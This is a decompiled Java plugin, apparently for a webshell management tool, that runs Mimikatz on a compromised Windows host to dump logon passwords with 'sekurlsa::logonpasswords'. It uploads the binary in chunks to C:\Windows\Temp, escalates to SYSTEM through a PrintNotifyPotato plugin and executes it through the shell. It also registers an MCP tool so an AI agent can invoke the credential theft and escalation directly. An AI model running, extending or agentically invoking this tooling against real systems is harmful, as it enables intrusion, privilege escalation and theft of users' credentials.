//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.generic;

import core.EasyI18N;
import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import core.annotation.McpTool;
import core.annotation.McpParam;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.util.Map;

public abstract class Mimikatz implements Plugin {
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JLabel argsLabel = new JLabel("args");
    private final JTextField argsTextField = new JTextField(" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" ");
    private final JButton runButton = new JButton("Run");
    private final JSplitPane splitPane = new JSplitPane();
    private final RTextArea resultTextArea = new RTextArea();
    private boolean loadState;
    protected ShellEntity shellEntity;
    protected Payload payload;
    private Encoding encoding;
    private ShellcodeLoader loader;

    public Mimikatz() {
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.argsLabel);
        topPanel.add(this.argsTextField);
        topPanel.add(this.runButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
            public void componentResized(ComponentEvent e) {
                Mimikatz.this.splitPane.setDividerLocation(0.15);
            }
        });
        this.panel.add(this.splitPane);
        EasyI18N.installObject(this);
    }

    protected abstract ShellcodeLoader getShellcodeLoader();

    private void runButtonClick(ActionEvent actionEvent) {
        if (this.loader == null) {
            this.loader = this.getShellcodeLoader();
        }

        if (this.loader == null) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "未找到loader");
        } else {
            byte[] pe = functions.readInputStreamAutoClose(Mimikatz.class.getResourceAsStream("assets/mimikatz-" + (this.payload.isX64() ? "64" : "32") + ".exe"));

            try {
                byte[] result = TH_TOOLS.runPePreferThTools(this.shellEntity, this.loader, this.argsTextField.getText().trim(), pe, 6000, this.resultTextArea.getPrintStream());
                this.resultTextArea.setText(this.encoding.Decoding(result));
            } catch (Exception var4) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), var4.getMessage());
            }

        }
    }

    protected ShellcodeLoader createLoader() {
        return null;
    }

    @McpTool(name = "run", desc = "运行 Mimikatz 凭据提取 (默认: privilege::debug sekurlsa::logonpasswords exit)。若已通过 plugin_TH_TOOLS_exec 提权(SYSTEM)则自动以 SYSTEM 执行; 未提权时建议先调用 plugin_TH_TOOLS_exec 提权", params = {
            @McpParam(name = "shellId", required = true, desc = "Shell ID"),
            @McpParam(name = "command", defaultValue = "\"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"", desc = "mimikatz 命令参数") })
    public String mcpRun(Map<String, Object> args) {
        String cmd = String.valueOf(args.getOrDefault("command", "\"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""));
        try {
            if (TH_TOOLS.isGlobalElevateEnabled(this.shellEntity)) {
                // 提权模式: 自动上传 mimikatz 并以 SYSTEM 上下文执行 (TH_TOOLS 提权命令链)
                byte[] pe = functions.readInputStreamAutoClose(Mimikatz.class.getResourceAsStream("assets/mimikatz-" + (this.payload.isX64() ? "64" : "32") + ".exe"));
                String remote = "C:\\Windows\\Temp\\gsl5_mimikatz.exe";
                System.out.println("[Mimikatz] upload start size=" + pe.length + " once=" + this.shellEntity.getOnceBigFileUploadByteNum());
                int once = this.shellEntity.getOnceBigFileUploadByteNum();
                for (int off = 0; off < pe.length; off += once) {
                    byte[] chunk = java.util.Arrays.copyOfRange(pe, off, Math.min(off + once, pe.length));
                    String flag = this.payload.bigFileUpload(remote, (long)off, chunk);
                    System.out.println("[Mimikatz] chunk off=" + off + " len=" + chunk.length + " flag=" + flag);
                    if (!"ok".equals(flag)) return "mimikatz 上传失败: " + flag;
                }
                System.out.println("[Mimikatz] upload done");
                String thToolsCn = this.payload.getClass().getName().contains("csharp") ? "shells.plugins.csharp.TH_TOOLS" : "shells.plugins.java.TH_TOOLS";
                TH_TOOLS thTools = (TH_TOOLS) Class.forName(thToolsCn).newInstance();
                thTools.init(this.shellEntity);
                thTools.CurrentPlugin = "PrintNotifyPotato";
                if (!thTools.loadPlugin(thTools.CurrentPlugin)) return "提权插件加载失败: " + thTools.CurrentPlugin;
                thTools.Excute_cmd = "cmd /c " + remote + " " + cmd;
                byte[] result = thTools.ExeCuteCmd();
                return this.encoding.Decoding(result);
            }
        } catch (Exception e) {
            return "提权执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
        }
        try {
            if (this.loader == null) {
                if (this.shellEntity != null && this.shellEntity.getFrame() != null) {
                    this.loader = this.getShellcodeLoader();
                }
                if (this.loader == null) {
                    this.loader = this.createLoader();
                }
            }
            return "当前未提权(SYSTEM)。MCP 环境下普通权限的 mimikatz 不可用, 请先调用 plugin_TH_TOOLS_exec 提权(如 plugin=PrintNotifyPotato), 再重试本工具。";
        } catch (Exception e) {
            e.printStackTrace(System.out);
            return "执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
        }
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(Mimikatz.class, this, Mimikatz.class, this);
    }

    public JPanel getView() {
        return this.panel;
    }
}
